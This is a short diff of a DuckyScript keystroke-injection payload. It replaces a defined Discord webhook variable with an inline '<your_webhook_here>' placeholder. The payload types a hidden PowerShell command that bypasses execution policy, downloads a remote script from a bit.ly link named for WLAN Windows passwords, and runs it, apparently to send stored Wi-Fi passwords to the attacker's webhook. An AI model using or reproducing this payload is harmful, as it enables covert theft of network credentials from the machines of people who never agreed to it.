@@ -9,10 +9,7 @@ REM # Version      : 1.0                                              |
 REM #                                                                 |
 REM ###################################################################
 
-REM REQUIRED - Provide URL used for Example
-DEFINE DISCORD_WEBHOOK example.com
-
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord=$DISCORD_WEBHOOK;irm bit.ly/WLAN-Windows-Password | iex
+STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/WLAN-Windows-Password | iex
